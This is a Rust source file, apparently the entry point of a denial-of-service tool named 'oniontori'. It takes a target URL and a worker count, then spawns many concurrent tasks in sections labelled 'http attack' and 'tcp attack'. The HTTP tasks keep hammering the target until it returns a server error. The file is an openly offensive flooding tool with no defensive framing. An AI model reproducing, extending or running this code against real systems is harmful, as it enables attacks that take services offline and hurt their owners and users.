


/*




 ▒█████   ███▄    █  ██▓ ▒█████   ███▄    █ ▄▄▄█████▓ ▒█████   ██▀███   ██▓
▒██▒  ██▒ ██ ▀█   █ ▓██▒▒██▒  ██▒ ██ ▀█   █ ▓  ██▒ ▓▒▒██▒  ██▒▓██ ▒ ██▒▓██▒
▒██░  ██▒▓██  ▀█ ██▒▒██▒▒██░  ██▒▓██  ▀█ ██▒▒ ▓██░ ▒░▒██░  ██▒▓██ ░▄█ ▒▒██▒
▒██   ██░▓██▒  ▐▌██▒░██░▒██   ██░▓██▒  ▐▌██▒░ ▓██▓ ░ ▒██   ██░▒██▀▀█▄  ░██░
░ ████▓▒░▒██░   ▓██░░██░░ ████▓▒░▒██░   ▓██░  ▒██▒ ░ ░ ████▓▒░░██▓ ▒██▒░██░
░ ▒░▒░▒░ ░ ▒░   ▒ ▒ ░▓  ░ ▒░▒░▒░ ░ ▒░   ▒ ▒   ▒ ░░   ░ ▒░▒░▒░ ░ ▒▓ ░▒▓░░▓  
  ░ ▒ ▒░ ░ ░░   ░ ▒░ ▒ ░  ░ ▒ ▒░ ░ ░░   ░ ▒░    ░      ░ ▒ ▒░   ░▒ ░ ▒░ ▒ ░
░ ░ ░ ▒     ░   ░ ░  ▒ ░░ ░ ░ ▒     ░   ░ ░   ░      ░ ░ ░ ▒    ░░   ░  ▒ ░
    ░ ░           ░  ░      ░ ░           ░              ░ ░     ░      ░  
                                                                           



*/



use clap::Parser;
use regex::Regex;
use is_type::Is;
use std::future::Future;
use std::thread;
use std::env;
use std::sync::{Arc, Mutex, mpsc as std_mpsc};
use std::process;
use hyper::{Client, Uri, Response, Body, Request};
use serde::{Deserialize, Serialize};
use rand::Rng;
use borsh::{BorshDeserialize, BorshSerialize};
use log4rs::append::console::ConsoleAppender;
use log4rs::config::{Appender, Root};
use log4rs::Config;
use log::{info, error, LevelFilter};
use tokio::net::{TcpListener, TcpStream}; //-- async tcp listener and stream
use tokio::io::{AsyncReadExt, AsyncWriteExt};
use tokio::sync::mpsc;
use uuid::Uuid;
use std::time::{Instant, Duration};
use crate::scheduler::*;






pub mod oniontori;
pub mod scheduler;
pub mod actor;






#[derive(Parser, Default, Debug)]
struct Arguments{
    pub url: String,
    pub tcp_addr: String,
    pub udp_addr: String,
    pub proc: u128,
}






#[tokio::main(flavor="multi_thread", worker_threads=10)] //// use the tokio multi threaded runtime by spawning 10 threads
async fn main() -> Result<(), Box<dyn std::error::Error + Send + Sync + 'static>>{


    let mut workers = Workers::new();
    let stdout = ConsoleAppender::builder().build();
    let config = Config::builder()
                                    .appender(Appender::builder().build("stdout", Box::new(stdout)))
                                    .build(Root::builder().appender("stdout").build(LevelFilter::Trace))
                                    .unwrap();
    let _handle = log4rs::init_config(config).unwrap();
    let re = Regex::new(r#"\\"(https?\\"://)?([^/]*)/?.*"#).unwrap(); // https://stackoverflow.com/a/54061205
    



    let args: Vec<String> = env::args().collect();
    let mut url = &String::new();
    let mut proc = &String::new();
    let mut tcp_addr = &String::new();
    let mut udp_addr = &String::new(); // TODO
    if args.len() > 3{
        url = &args[1];
        proc = &args[2];
        tcp_addr = &args[3];
    } else{
        error!("args required > url and number or process");
        process::exit(1);
    }



    let parsed_proc = proc.parse::<u128>().unwrap();
    let url_with_slash = &format!("{}/", url.clone()); // making a longer lifetime of the url which is outside of the following if 
    if url != &"".to_string() && !url.ends_with("/"){
        // url = &format!("{}/", url.clone()); // when we initialize a new url with format! it's valid as long as we're inside the if and once we get outta of this scope url will no longer be valid
        url = url_with_slash;
    } 

    let host = if let Some(host) = re.captures(url){
        host.get(2).unwrap().as_str() // anything in parentheses () inside the defined pattern will be a capture group
    } else{
        ""
    };



    let parsed_url = url.parse::<Uri>().unwrap();
    assert_eq!(parsed_url.scheme_str(), Some("http")); // make sure the http is correct
    let thedos = oniontori::TheDos::new(&url, &tcp_addr, &udp_addr, host); // pass String by reference convert them to &str automatically
    

    

    //// --------------------- http attack

        for p in 0..parsed_proc{
            let mut thedos = thedos.clone();
            workers.spawn(async move{
                while thedos.flag <2{
                    thedos.httpcall().await;
                    if thedos.status_code == 500{
                        thedos.flag = 2;
                    }
                }
                Ok(())
            }) // if Ok(()) and worker spawn() method went wrong error would be Box<dyn std::err::Error + Send + Sync 'static>
        }


    //// --------------------- tcp attack
    
        for p in 0..parsed_proc{
            let mut thedos = thedos.clone();
            workers.spawn(async move{
                thedos.tcpcall().await;
                Ok(())
            }) // if Ok(()) and worker spawn() method went wrong error would be Box<dyn std::err::Error + Send + Sync 'static>
        }
    

    
            
    workers.run().await // wait for all workers to complete




}

